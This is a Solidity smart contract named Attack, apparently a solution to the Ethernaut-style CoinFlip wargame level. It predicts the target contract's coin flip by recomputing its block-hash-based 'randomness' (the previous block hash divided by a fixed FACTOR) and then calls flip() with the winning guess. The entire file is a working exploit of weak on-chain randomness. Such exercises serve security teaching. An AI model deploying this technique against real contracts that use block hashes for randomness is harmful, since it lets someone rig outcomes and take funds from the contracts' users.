// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract Attack {
    using SafeMath for uint256;
    CoinFlip coinflip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflip) public {
        coinflip = CoinFlip(_coinflip);
    }

    function predictFlip() public returns (bool) {
        uint256 blockNumber = getBlockNumber();
        uint256 blockHash = getBlockHash(blockNumber);
        uint256 coinFlip = blockHash.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
        return (side);
    }

    function getBlockHash(uint256 blockNumber) public returns (uint256) {
        uint256 blockHash = uint256(blockhash(blockNumber));
        return blockHash;
    }

    function getBlockNumber() public returns (uint256) {
        uint256 blockNumber = uint256(block.number.sub(1));
        return blockNumber;
    }
}
